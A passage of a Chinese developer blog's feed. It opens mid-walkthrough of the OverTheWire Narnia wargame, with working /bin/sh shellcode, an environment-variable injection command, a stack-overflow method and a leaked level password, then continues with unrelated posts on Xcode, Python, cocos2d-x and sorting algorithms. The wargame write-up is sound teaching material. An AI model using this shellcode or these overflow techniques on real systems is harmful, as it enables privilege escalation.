+其中python格式化字符串的用法在准备知识里已经讲过, 但是为什么python脚本后面还跟着一个无参数的cat命令呢? 如果不加这个cat指令你会发现, val的值虽然被更改了, 但是程序一下子就退出了, 说好的shell呢? 这大概是因为管道在将python脚本的输出转为narnia0程序的STDIN的过程中在STDIN中添加了EOF(文件终止符), 导致shell启动之后遇到EOF又被终止了, 无参数的cat指令会从键盘获取输入, 这样在python脚本之后添加cat指令, cat会捕获到最后添加的那个EOF, 于是终止了cat程序自身, 从而使shell程序幸免于难. 于是乎, 我们在这个由 <code>system("/bin/sh");</code> 启动的shell程序中输入ls, 发现确实打印出了当前目录下的文件列表, 欣喜之余, 我们cd到 <code>/etc/narnia0_pass/</code> 目录下, 我要告诉你这个目录下存放着所有关卡的密码, 敲入ls, 可以看到narnia0至narnia9这10个文件, 每个文件都存放着各自关卡的密码, 正常来说, 只有narnia0用户登录的玩家才能访问narnia0文件, 其他文件同理, 我们此时是narnia0用户, 理论上来讲我们只能访问narnia0文件, narnia1文件是无权限访问的, 然而从上图你可以看到, <code>cat narnia1</code> 居然看到了narnia1关卡的密码, 而 <code>cat narnia0</code> 的时候却提示无权限, 这是为什么呢? 其实这是该游戏关卡设计的策略, 其想达到的目的就是, 在narnia0程序中启动的shell可以拥有narnia1用户的权限, 在narnia1程序中启动的shell可以拥有narnia2用户的权限, 依此类推, 也就是引导玩家在每一个关卡中想方设法在该关卡的程序中启动一个shell, 该shell拥有下一关用户的权限所以可以看到下一关卡的密码. 那么这种效果是如何做到的呢, 说来话长, 我只能简短介绍, 其余的留给你自己来搜索, 每一个进程都有两个id, uid和euid, 其中uid叫做用户标识, euid叫做有效用户标识, 进程的euid如果设置成X用户, 无论当前程序是由哪一个用户运行起来的, 该程序都会拥有euid代表的X用户的权限, 所以说可以想象该游戏使用了这个技术, 对于每一个关卡的可执行文件, 它的euid都是指向下一个用户的, 该程序运行起来拥有下一个关卡用户的权限, 所以它的子进程shell也拥有下一个关卡用户的权限.</p>
+
+<p>好了, 进行到这里, 我们已经获得了narnia1关卡的密码<strong>efeidiedae</strong>, 接下来就用narnia0关卡中学到的知识和思路, 去寻找在narnia1程序中启动一个shell的方法吧~</p>
+
+<h3>第1关:覆盖函数指针</h3>
+
+<p>使用narnia1作为用户名登录narnia服务器:</p>
+
+<pre><code>ssh -l narnia1 narnia.labs.overthewire.org  
+</code></pre>
+
+<p>我们找到narnia1.c来一看究竟:</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n";
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = getenv("EGG");
+    ret();
+
+    return 0;
+}
+</code></pre>
+
+<p>好单纯的代码, getenv函数会返回名字为"EGG"的环境变量字符串的地址, 我们看到代码中把该地址赋值给ret函数指针, 接下来调用ret函数的时候, 实际上代码会跳转到EGG环境变量的字符串地址上, 这里有个重要思想是, <strong>数据即代码</strong>, 虽然在正常意义上来讲环境变量只是字符串, 但是对于计算机来说, 它会把eip寄存器指向的地址放的任何东西看作是代码, 所以我们只要在EGG的字符串内容里放入代码, 当ret函数调用的时候, 会jmp倒ret函数的地址处, 此时eip的值就是函数的地址, 所以我们放入的代码就会被执行, 其实这种伪装成数据的代码有一个帅气的名字: <strong>Shellcode</strong> . 前面已经讲过narnia1是一个拥有narnia2用户权限的二进制文件, 如果narnia1中创建shell子进程, 则该shell讲拥有narnia2的用户权限, 这样我们就可以访问narnia2用户的密码了, 所以我们要插入的shellcode的功能就是创建一个shell, 其实早先大部分shellcode的功能都是创建shell, 这可能也是Shellcode名称的由来. 那么如何编写Shellcode呢, 方法有很多, 你完全可以用C语言编写一段启动Shell的代码, 然后将它进行汇编, 编译形成2进制串, 这个二进制串就是Shellcode, 鉴于完整的讲述如何生成Shellcode需要花费较多篇幅, 我们偷个懒直接从大牛的网站copy一份过来, 比如这里 : <a href="http://www.shell-storm.org/shellcode/files/shellcode-811.php">shellcode-811</a>.</p>
+
+<pre><code>char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
+                   "\x68\x68\x2f\x62\x69\x6e\x89"
+                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+                   "\xcd\x80\x31\xc0\x40\xcd\x80";
+</code></pre>
+
+<p>接下来就是把Shellcode伪装的字符串放入环境变量中了, 一行命令即可:</p>
+
+<pre><code>export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+</code></pre>
+
+<p>这时我们再执行 <code>./narnia1</code> ,会发现我们成功地启动了shell, 轻松获得了narnia2用户的密码:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/narnia1.png" alt="image" /><br/>
+如果你还云里雾里, 那么我们来跟踪下汇编代码, 看看发生了什么?</p>
+
+<pre><code>0x08048434 &lt;+0&gt;:    push   ebp
+0x08048435 &lt;+1&gt;:    mov    ebp,esp
+0x08048437 &lt;+3&gt;:    and    esp,0xfffffff0
+0x0804843a &lt;+6&gt;:    sub    esp,0x20
+0x0804843d &lt;+9&gt;:    mov    DWORD PTR [esp],0x8048560
+0x08048444 &lt;+16&gt;:   call   0x8048330 &lt;getenv@plt&gt;
+0x08048449 &lt;+21&gt;:   test   eax,eax
+0x0804844b &lt;+23&gt;:   jne    0x8048465 &lt;main+49&gt;
+0x0804844d &lt;+25&gt;:   mov    DWORD PTR [esp],0x8048564
+0x08048454 &lt;+32&gt;:   call   0x8048340 &lt;puts@plt&gt;
+0x08048459 &lt;+37&gt;:   mov    DWORD PTR [esp],0x1
+0x08048460 &lt;+44&gt;:   call   0x8048360 &lt;exit@plt&gt;
+0x08048465 &lt;+49&gt;:   mov    DWORD PTR [esp],0x8048599
+0x0804846c &lt;+56&gt;:   call   0x8048340 &lt;puts@plt&gt;
+0x08048471 &lt;+61&gt;:   mov    DWORD PTR [esp],0x8048560
+0x08048478 &lt;+68&gt;:   call   0x8048330 &lt;getenv@plt&gt;
+0x0804847d &lt;+73&gt;:   mov    DWORD PTR [esp+0x1c],eax
+0x08048481 &lt;+77&gt;:   mov    eax,DWORD PTR [esp+0x1c]
+0x08048485 &lt;+81&gt;:   call   eax
+0x08048487 &lt;+83&gt;:   mov    eax,0x0
+0x0804848c &lt;+88&gt;:   leave
+0x0804848d &lt;+89&gt;:   ret
+</code></pre>
+
+<p>对应到C代码, 根据函数名称我们可以很快锁定到这行代码: <code>0x08048478 &lt;+68&gt;: call   0x8048330 &lt;getenv@plt&gt;</code> ,它调用getenv函数获得EGG内容, 在汇编中函数的返回值会放到eax寄存器中, 所以我们看到下一句: <code>mov    DWORD PTR [esp+0x1c],eax</code> ,它是将返回值也就是EGG内容的地址赋值给ret函数指针, 接下来就是调用ret函数, 我们看到 <code>call eax</code> 指令, 我们在这一行打上断点并运行, 查看一下eax的值, 0xffffd949, 这就是EGG的内容所在的地址, 也就是我们存放Shellcode的地址, 现在我们验证一下这个地址的内容是不是之前插入的Shellcode:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/sc1.png" alt="image" /><br/>
+X86架构使用小端模式, 所以我们从16进制的低位开始看起, 31, c0, 50, 68, ......, 很明显, 这正是我们的Shellcode.</p>
+
+<p>简单总结一下, 在narnia0关卡我们学会了利用数组溢出来覆盖栈上的内存, 而在narnia1中我们不仅覆盖栈上的内存, 而且使用精心构造的Shellcode来覆盖函数指针指向的内容, 来实现我们想要的功能, 这是一个重要的进步, 接下来的narnia2关卡将更进一步, 我们将会看到经典的缓冲区溢出案例.</p>
+
+<h3>第2关:覆盖函数返回地址</h3>
+
+<p>前两关我比较细致地讲解整个操作过程甚至包括最基本的shell命令和gdb命令, 有了前面的铺垫, 这一关开始我会简化操作过程的讲解, 着重思路和原理.<br/>
+来看一下第二关源码:</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(int argc, char * argv[]){
+    char buf[128];
+
+    if(argc == 1){
+        printf("Usage: %s argument\n", argv[0]);
+        exit(1);
+    }
+    strcpy(buf,argv[1]);
+    printf("%s", buf);
+
+    return 0;
+}
+</code></pre>
+
+<p>对应的汇编代码如下:</p>
+
+<pre><code>0x08048424 &lt;+0&gt;:    push   ebp
+0x08048425 &lt;+1&gt;:    mov    ebp,esp
+0x08048427 &lt;+3&gt;:    and    esp,0xfffffff0
+0x0804842a &lt;+6&gt;:    sub    esp,0x90
+0x08048430 &lt;+12&gt;:   cmp    DWORD PTR [ebp+0x8],0x1
+0x08048434 &lt;+16&gt;:   jne    0x8048458 &lt;main+52&gt;
+0x08048436 &lt;+18&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x08048439 &lt;+21&gt;:   mov    edx,DWORD PTR [eax]
+0x0804843b &lt;+23&gt;:   mov    eax,0x8048560
+0x08048440 &lt;+28&gt;:   mov    DWORD PTR [esp+0x4],edx
+0x08048444 &lt;+32&gt;:   mov    DWORD PTR [esp],eax
+0x08048447 &lt;+35&gt;:   call   0x8048320 &lt;printf@plt&gt;
+0x0804844c &lt;+40&gt;:   mov    DWORD PTR [esp],0x1
+0x08048453 &lt;+47&gt;:   call   0x8048350 &lt;exit@plt&gt;
+0x08048458 &lt;+52&gt;:   mov    eax,DWORD PTR [ebp+0xc]
+0x0804845b &lt;+55&gt;:   add    eax,0x4
+0x0804845e &lt;+58&gt;:   mov    eax,DWORD PTR [eax]
+0x08048460 &lt;+60&gt;:   mov    DWORD PTR [esp+0x4],eax
+0x08048464 &lt;+64&gt;:   lea    eax,[esp+0x10]
+0x08048468 &lt;+68&gt;:   mov    DWORD PTR [esp],eax
+0x0804846b &lt;+71&gt;:   call   0x8048330 &lt;strcpy@plt&gt;
+0x08048470 &lt;+76&gt;:   mov    eax,0x8048574
+0x08048475 &lt;+81&gt;:   lea    edx,[esp+0x10]
+0x08048479 &lt;+85&gt;:   mov    DWORD PTR [esp+0x4],edx
+0x0804847d &lt;+89&gt;:   mov    DWORD PTR [esp],eax
+0x08048480 &lt;+92&gt;:   call   0x8048320 &lt;printf@plt&gt;
+0x08048485 &lt;+97&gt;:   mov    eax,0x0
+0x0804848a &lt;+102&gt;:  leave
+0x0804848b &lt;+103&gt;:  ret
+</code></pre>
+
+<p>程序很简单, 我们一眼就可以看到会产生溢出的地方, 就是strcpy函数, 如果我们输入超过128长度的字符串就会产生buf的溢出, 然而回忆一下第1关, 程序之所以会调用我们的Shellcode是因为程序中调用了ret函数, 而ret函数的地址已经被我们控制了. 可是在本关卡中, strcpy之后就直接输出然后return 0返回, 即使我们在输入数据中插入Shellcode貌似也没有执行的机会啊, 怎么办呢? 当年首个蠕虫病毒的作者Morris给出了一个天才般的解答. 让我们回顾在第0关中的表述:</p>
+
+<blockquote><p>调用函数的时候, 会先把传给该函数的参数压入栈中, 再将函数返回后下一个指令的地址压入栈中我们简称保存该指令的区域为RET, 然后抽象的角度来看会为该函数创建一个栈帧, 会向栈帧中压入函数调用者栈帧的地址, 然后为该函数中定义的各个变量依次预留空间, 无论该函数多么复杂, 定义了多少变量, 当它执行完后首先会将该函数栈帧弹栈然后通过ret指令来将控制权交给函数调用者, 并执行之前保存的RET指向的指令.</p></blockquote>
+
+<p>比如上面的汇编代码中, <code>0x0804846b &lt;+71&gt;:  call   0x8048330 &lt;strcpy@plt&gt;</code> ,call指令做了两件事, 第一件是先把下一行指令 <code>0x08048470 &lt;+76&gt;: mov    eax,0x8048574</code> 的地址 <code>0x08048470</code> 压到栈中, 第二件是jmp到libc库中strcpy函数的地址处也就是 <code>0x8048330</code> , 当strcpy函数执行完成之后会调用ret指令将栈中之前保存的地址 <code>0x08048470</code> pop到EIP寄存器中, 由于CPU每次都会从EIP寄存器中取出下一个要执行的指令, 从而将程序的执行流程带回到原程序中.</p>
+
+<p>这个时候我们灵光一现, 想想既然call指令会把函数返回地址压到栈中, 那岂不是白白将一个水灵灵的大美女扔到我们面前么, 要知道第0关起的标题可是<strong>覆盖栈内存</strong>啊! 只要利用buf数组的溢出来覆盖main函数的返回地址不就可以控制程序的流程了么. 结合前面栈的内存布局图示想一想buf数组在栈中的位置以及函数返回地址的存储位置.</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/stack3.png" alt="image" /></p>
+
+<p>buf数组的存储当然是从低地址向高地址存, 那么溢出之后显然是朝着函数返回地址直奔而去啊, 只要在buf数组的适当位置插入Shellcode,稍微计算一下溢出的长度然后将函数返回地址覆盖成Shellcode的开始地址, 当main函数返回的时候就可以执行到可爱的Shellcode了!</p>
+
+<p>来少年们来看一下操作过程, 我现在想看看buf数组在栈中的位置, 怎么办呢? 可以做一下实验, 在buf中输入一堆一眼就能看出来的字符, 然后在gdb中查看栈内存找到这些特殊字符就ok~. 好的先在 <code>0x08048470 &lt;+76&gt;:    mov    eax,0x8048574</code> 这一行打上断点, 也就是strcpy指令的下一个指令, 然后敲入</p>
+
+<blockquote><p>run `python -c 'print "\x90"*128'`</p></blockquote>
+
+<p>来启动程序并传入参数, 这里使用的是python来生成二进制串, 128个0x90, 正好是程序中buf数组的大小. 程序走到断点处停下来, 输入</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Xcode Duplicate Symbol错误</title>
+      <link href="http://mikewang.github.com/2014/01/XCode-duplicate-symbol%E9%94%99%E8%AF%AF/"/>
+      <pubDate>2014-01-03T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2014/01/XCode-duplicate-symbol错误</guid>
+      <content:encoded><![CDATA[<p>项目里用到不少静态库, 编译通过了, link的时候真机没问题, 模拟器却死活link不过, 错误就是坑爹的duplicate symbol.
+我特么google好顿搜索, 什么合并静态库什去掉link选项之类的都试过, 还是不好用, 郁闷. 自己冷静分析一下原因,
+如果有重复符号存在, 为何真机能link过, 模拟器link不过, 有两种可能性.</p>
+
+<ol>
+<li>我使用的模拟器i386库存在重复符号, 而真机armv7库不存在重复符号.</li>
+<li>link的时候, xcode在link i386库和armv7的时候使用了不同的link选项.</li>
+</ol>
+
+
+<p>so, 接下来就是排除问题, 我用nm命令查看了i386和armv7库, 发现都存在重复符号, 那么第一个可能性被排除,
+然后我又去比较了xcode在link两个库时候的link选项, 发现armv7库在link的时候多出了dead_strip一项选项, 眼前一亮, what's this?
+google一下, 发现确实和重复符号有关, 不管怎么样先试一下, 于是在other link flag 中添加了-dead_strip一项, 果不其然,
+这会模拟器也link通过了.</p>
+
+<p>搜了一下dead_strip, 应该是删除多余的库符号.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>造轮子计划</title>
+      <link href="http://mikewang.github.com/2013/10/%E9%80%A0%E8%BD%AE%E5%AD%90%E8%AE%A1%E5%88%92/"/>
+      <pubDate>2013-10-09T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2013/10/造轮子计划</guid>
+      <content:encoded><![CDATA[<p>学习算法真痛苦, 我这种人渣总是非得有大把的时间才会认真的学习, 边角时间我根本用不起来, <br/>
+导致这算法一直停滞不前, 好痛苦.</p>
+
+<p>一天天的受不鸟了, 稍等些日子, 我得好好造轮子了.</p>
+
+<ol>
+<li>游戏, 我感兴趣的是各种博弈游戏, 从棋类开始吧, 写完整的棋类游戏包括AI.顺便练练多线程神马的.</li>
+<li>小型编译器, 参考《编译原理与实践》, 龙叔, 虎叔之类的.</li>
+<li>正则表达式引擎, vc大神的建议, 其实在2里应该可以涉及到.</li>
+<li>小型操作系统, 结合《Orange‘S 一个操作系统的实现》和《30天动手制作操作系统》.</li>
+<li>病毒啊木马啊外挂啊什么的, 大学不是一直在写着么, 不过都是弱智玩意, 这回学学PE格式之类的, 然后搞搞驱动.</li>
+</ol>
+
+
+<p>这些够我折腾了, 求求我自己了, 抓紧点时间吧.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Pythonnic 记录</title>
+      <link href="http://mikewang.github.com/2013/09/Pythonnic-%E8%AE%B0%E5%BD%95/"/>
+      <pubDate>2013-09-10T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2013/09/Pythonnic-记录</guid>
+      <content:encoded><![CDATA[<p>1.map的使用</p>
+
+<pre><code>    map(int, raw_input().split(' '))  
+</code></pre>
+
+<p><em>注:input()的输入参数可以是python的表达式, 而raw_input()是原原本本的输入字符串<br/>
+</em>这个技巧在刷题的时候用来输入一串整型数经常用到</p>
+
+<p>2.字符与值的转换</p>
+
+<pre><code>    print ord('C')
+    print chr(97)
+</code></pre>
+
+<p>*注: 打印出来就明白了</p>
+
+<p>3.全排列</p>
+
+<pre><code>    itertools.permutations([0,1,2,3,4,5,6,7,8,9])
+</code></pre>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>[译] How To Optimise Memory Usage(cocosd2d X)</title>
+      <link href="http://mikewang.github.com/2013/08/%5B%E8%AF%91%5D-How-to-Optimise-Memory-Usage%28Cocosd2d-x%29/"/>
+      <pubDate>2013-08-29T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2013/08/[译]-How-to-Optimise-Memory-Usage(Cocosd2d-x)</guid>
+      <content:encoded><![CDATA[<p><a href="http://www.cocos2d-x.org/projects/cocos2d-x/wiki/How_to_optimise_memory_usage">原文地址</a><br/>
+为了练习英语= =, 翻译了一篇cocos2d-x内存优化的文章, 发现文章本身并没有什么杀手级的优化手段, 所以请欣赏我精湛的翻译技巧.(逃...<br/>
+不了解cocos2d-x的不用看了, 这不是一篇一般性的优化指导.<br/>
+这是我第一次翻译英文文章, 有不懂的地方请参照原文.</p>
+
+<h1>怎样优化内存使用</h1>
+
+<pre><code>- 内存优化原则  
+  + 了解瓶颈所在, 把它们显示出来~.  
+  + 拒绝过度优化.  
+- 内存优化的层次  
+  + cocos2d-x 客户端层  
+  + cocos2d-x 引擎层  
+  + c++ 语言层次  
+- 提示 &amp; 技巧  
+- 推荐阅读  
+</code></pre>
+
+<h2>内存优化原则</h2>
+
+<p>为了优化程序的内存使用, 你应该知道是什么消耗了你的程序中大部分的内存. 答案就是<em>纹理</em>!<br/>
+纹理几乎占据了游戏中90%的内存. 所以我们应该尽最大的努力缩减我们程序中纹理的内存使用,
+否则当系统处于低内存警告时就会杀掉你的程序.<br/>
+这里我讲给出关于cocos2d-x游戏内存优化原则的两个一般性指导.</p>
+
+<h3>了解瓶颈所在, 把它们显示出来</h3>
+
+<p>哪种类型的纹理占据了大部分的程序内存? 这些纹理占据了多少内存?<br/>
+你可不要数着手指头胡乱猜测.<br/>
+恰好有这样一个工具集为你而准备的. 它们是苹果公司出品的工具, Allocations和Leaks.<br/>
+你可以在Xcode中长按Run键然后选择Profile选项来选择这两个工具.<br/>
+下面是截图:<br/>
+<img src="https://raw.github.com/ellochen/Img-store/master/instruments.jpeg" alt="" /><br/>
+你可以使用Allocation工具来监控你的程序内存使用情况, 并使用Leaks来观察内存泄露.<br/>
+你仍然可以使用一些代码来获取关于程序内存使用的有用信息.<br/>
+给出代码:</p>
+
+<pre><code>    CCTextureCache::sharedTextureCache()-&gt;dumpCachedTextureInfo();  
+</code></pre>
+
+<p>当你调用这行代码并在DEBUG运行你的游戏时, 你将在Xcode的Console窗口看到一些格式化的log.<br/>
+它们就像这样:</p>
+
+<pre><code>    Cocos2d: cocos2d: "cc_fps_images" rc=5 id=3 256 x 32 @ 16 bpp =&gt; 16 KB
+    Cocos2d: cocos2d: "XXX/hd/actor.pvr.ccz" rc=1059 id=4 2048 x 2048 @ 32 bpp =&gt; 16384 KB
+    Cocos2d: cocos2d: CCTextureCache dumpDebugInfo: 2 textures, for 16400 KB (16.02 MB)
+</code></pre>
+
+<p>就像你看到的, 它显示了纹理的名字, 引用计数, id, size以及每像素有多少位(bit). 另外非常重要的一点, <br/>
+它显示了纹理的内存使用情况.在这里<em>cc_fps_images</em>占据16KB的内存, 而actor.pvr.ccz却占据了16M内存之多.</p>
+
+<h3>拒绝过度优化</h3>
+
+<p>这是一个一般性的优化原则. 你在做内存优化的时候需要做适当的权衡. 因为有时图片质量和图片内存是对立的.<br/>
+永远不要去过度优化!  (译注: 作者这么激动,我猜他是想说否则美术MM会发怒的!)</p>
+
+<h2>内存优化的层次</h2>
+
+<p>这里我们将cocos2d-x的内存优化划分为3个层次. 在每一个层次上, 我们有不同的观点和策略也包括一小点变化.</p>
+
+<h3>cocos2d-x 客户端层</h3>
+
+<p>这是最重要的优化层次, 我们应该引起注意. 我们是在cocos2d-x的引擎之上构建我们的程序的, 所以引擎自身多少提供了一些优化选项.<br/>
+在这个层次, 我们的付出将会回报很多.<br/>
+简言之, 我们可以优化诸如纹理, 音频, 字体以及粒子系统的内存使用.</p>
+
+<ul>
+<li>首先, 让我们优化下纹理.<br/>
+为了优化纹理的使用, 我们必须知道神马因素导致纹理内存的大量使用.<br/>
+这里有3个因素, 它们是纹理的格式(压缩的或者未压缩的), 色深和大小.<br/>
+我们可以使用PVR格式的纹理来减小内存使用. 推荐的纹理格式是pvr.ccz.
+纹理每像素用到的位(bit)越多, 图片的质量越好. 但是它将同样占据更多的内存.<br/>
+所以我们使用纹理色深RBGA4444来代替RBGA8888, 前者耗费的内存是后者的一半.<br/>
+我们也发现大的纹理也会引起内存相关的问题.所以你最好使用适度大小的纹理.</li>
+<li>其次, 让我们做一些关于音频的工作<br/>
+同样也有三个因素影响音频文件的内存使用. 它们是音频文件的格式, 比特率(bit rate)和抽样率(sample rate).<br/>
+我们喜欢mp3格式的音频文件. 因为它同时支持android和ios平台. mp3是一种压缩的格式并且可被硬件加速.<br/>
+你应该保持你的背景音乐大小在800KB以下. 最简单的方式是减少背景音乐的时间并且在程序中重复播放.<br/>
+你应该保持你的音频抽样率在96-128kbps之前, 比特率有44kHz也足够了.</li>
+<li>最后, 我们来谈谈关于字体和粒子系统的优化.<br/>
+这里我们给出2个小建议: 当使用BMFont来显示Game分数时, 应该最小化你图片中的字符数量. 比如,
+如果你只想显示数字, 就将图片中所有的字母都去掉.<br/>
+至于粒子, 我们应该通过减少粒子的数量来减少内存使用.</li>
+</ul>
+
+
+<h3>cocos2d-x 引擎层</h3>
+
+<p>如果你不是OpenGLES和游戏引擎高手, 你可以将这一层次的优化交给我们.<br/>
+cocos2d-x是开源的游戏引擎, 如果你多少有一些引擎层次的优化, 请让我们知道!<br/>
+我们欢迎任何改进和代码提交.</p>
+
+<h3>C++ 语言层次</h3>
+
+<p>在这一层次, 我建议使用cocos2d-x提供的内存管理方式并尽你最大的努力避免内存泄露.</p>
+
+<h2>提示 &amp; 技巧</h2>
+
+<ol>
+<li>一帧一帧地读取游戏资源.</li>
+<li>减少draw的调用: 使用CCSpriteBatchNode.</li>
+<li>从大到小加载纹理.</li>
+<li>留意内存峰点.</li>
+<li>使用闪屏来提前加载游戏资源.</li>
+<li>及时释放不用的资源.</li>
+<li>在内存警告的时候释放缓存的资源.</li>
+<li>使用texturePacker来优化纹理的大小, 格式, 色深等等.</li>
+<li>小心使用JPGs!</li>
+<li>使用16-bit, RBGA4444色深的纹理.</li>
+<li>使用NPOT纹理代替POT纹理.</li>
+<li>避免加载过大的纹理.</li>
+<li>相对于原始PNG文件优先使用1024 * 1024的NPOT pvr.ccz纹理.</li>
+</ol>
+
+
+<h2>推荐阅读</h2>
+
+<p><a href="http://www.learn-cocos2d.com/2012/11/optimize-memory-usage-bundle-size-cocos2d-app/">Steffen Itterheim's cocos2d memory optimization tutorials</a><br/>
+<a href="https://developer.apple.com/library/ios/documentation/3DDrawing/Conceptual/OpenGLES_ProgrammingGuide/TechniquesForWorkingWithTextureData/TechniquesForWorkingWithTextureData.html">Apple's developer guide for reducing memory usage</a></p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>算法导论笔记 第一章 And 第二章</title>
+      <link href="http://mikewang.github.com/2013/08/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0-and-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
+      <pubDate>2013-08-07T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2013/08/算法导论笔记-第一章-and-第二章</guid>
+      <content:encoded><![CDATA[<p>插入排序和抓牌的过程是一样的, 右手抓牌向左手放, 每次抓到新牌都与左手中的牌从右至左比较一番,找到合适的位置放置.循环直到抓完所有牌.<br/>
+python源码如下: (之后都用python来翻译书中的伪码)</p>
+
+<pre><code>    def isort(a):
+        for j in xrange(1, len(a)):
+            key = a[j]
+            i = j - 1
+            while i &gt;= 0 and a[i] &gt; key:
+                a[i + 1] = a[i]
+                i = i - 1
+            a[i + 1] = key
+    a = [2,4,6,1,3,7,9,8]
+    isort(a)
+    print a  
+</code></pre>
+
+<p>在证明插入排序的时候, 书中提到了 循环不变式(loop invariant), 网上有人说这里应该翻译成循环不变性,是一种属性."要寻找循环不变的特性，一般都是循环结束时数据具有的特性."
+注:简单说下算法导论中的伪代码, 和python一样的缩进很喜欢, 但是数组下标从一开始有些不习惯, 另外, do关键字让我误以为是do…while循环, 实际上只是和循环语义搭配的关键字.</p>
+
+<hr />
+
+<p>习题:选择排序(selection sort)</p>
+
+<pre><code>    def ssort(a):
+        for i in xrange(0, len(a)):
+            key = i
+            for j in xrange(i + 1, len(a)):
+                if a[key] &gt; a[j]:
+                    key = j
+            a[key], a[i] = a[i], a[key]
+
+    a = [2,6,9,11,3,8,1,12,11,102]
+    ssort(a)
+    print a
+</code></pre>
+
+<p>试着用循环不变性分析一下:<br/>
+最终排序的结果是有序数组,故循环不变性即有序性.<br/>
+初始化:只有一个数的情况, 符合有序性.<br/>
+保持:每个循环都找出当前最小数,也就是上一个循环的次小数,放进数组,故每次循环都保证了有序性.<br/>
+终止:当i == n-1时, 所有数都重新放进数组,且符合有序性.<br/>
+(感觉都是废话...</p>
+
+<hr />
+
+<p>分治法:将原问题划分成n个规模较小而结构与原问题相似的子问题,递归地解决这些子问题,然后再合并其结果.合并排序(归并排序)完全依照分治法的模式进行. <br/>
+分解(Divide)->解决(Conquer)->合并(Combine)<br/>
+最关键也是相对比较困难的步骤是合并的这个过程.<br/>
+首先将数组a划分为两个部分a[p…q]和a[q+1…r],分别排序后,合并到一起, 实际上就是合并两个有序数组, 每次从两个数组中最小的一端开始取出相对较小的元素push到新数组中,最后得到有序数组, 书中具体的做法是分别从a[p…q]和a[q+1…r]复制到两个新数组La和Lb, 然后以如上策略从La和Lb中取元素依次放至原数组,从而完成合并,这里似乎较难找到不创建新数组原地合并的方法.代码如下:</p>
+
+<pre><code>    from copy import deepcopy
+    def merge(arr, p, q, r):
+        n1 = q - p + 1
+        n2 = r - q
+        la = deepcopy(arr[p : q + 1])
+        lb = deepcopy(arr[q + 1 : r + 1])
+        la.append(9999999)
+        lb.append(9999999)
+        i = 0
+        j = 0
+        for k in xrange(p, r + 1):
+            if la[i] &gt;= lb[j]:
+                arr[k] = lb[j]
+                j = j + 1
+            elif la[i] &lt; lb[j]:
+                arr[k] = la[i]
+                i = i + 1
+</code></pre>
+
+<p>(学到了python中 deepcopy的使用= =<br/>
+排序函数代码如下:</p>
+
+<pre><code>    def msort(arr, p, r):
+        if p &lt; r:
+            q = (p + r) / 2
+            msort(arr, p, q)
+            msort(arr, q + 1, r)
+            merge(arr, p, q, r)
+
+a = [2,4,8,1,6,9,12,11,18,102,35,7,9,8]
+msort(a, 0, len(a) - 1)
+print a
+</code></pre>
+
+<p>习题中有个提到冒泡排序的,顺手给写了吧,其他习题暂时不做了.
+        def psort(arr):
+            for i in xrange(0, len(arr)):
+                for j in xrange(len(arr) - 1, i, -1):
+                    if arr[j - 1] > arr[j]:
+                        arr[j - 1], arr[j] = arr[j], arr[j - 1]
+        arr = [1,2,4,6,5,12,46,13,17,14,7]
+        psort(arr)
+        print arr</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Linux批量转码工具</title>
+      <link href="http://mikewang.github.com/2013/08/Linux%E6%89%B9%E9%87%8F%E8%BD%AC%E7%A0%81%E5%B7%A5%E5%85%B7/"/>
+      <pubDate>2013-08-07T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2013/08/Linux批量转码工具</guid>
+      <content:encoded><![CDATA[<p>占个坑 find . -name "*.h" -exec sh -c "enca -L zh_CN -x UTF-8 {}" \;</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>大白话讲解如何给github上项目贡献代码</title>
+      <link href="http://mikewang.github.com/2013/03/%E5%A4%A7%E7%99%BD%E8%AF%9D%E8%AE%B2%E8%A7%A3%E5%A6%82%E4%BD%95%E7%BB%99github%E4%B8%8A%E9%A1%B9%E7%9B%AE%E8%B4%A1%E7%8C%AE%E4%BB%A3%E7%A0%81/"/>
+      <pubDate>2013-03-30T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2013/03/大白话讲解如何给github上项目贡献代码</guid>
+      <content:encoded><![CDATA[<p>本文献给对git很迷茫的新手，注意是新手，但至少会点基本操作，有点基本概念的新手，我不会从怎么用github和git是什么开始讲的。如果作为新手你看书又看不进去，原理又太复杂，有没有直接了当告诉我们怎么给项目贡献代码，并和项目同步代码的大体流程。于是我快速写了这么个东西。一来整理下自己混乱的思路，二来想号召大家一起用git开发点东西，可是好几个同鞋只会寂寞的给自己push。</p>
+
+<p>我先说下 我之前对github操作的一些迷茫历程，然后之后是怎么解惑的。</p>
+
+<ol>
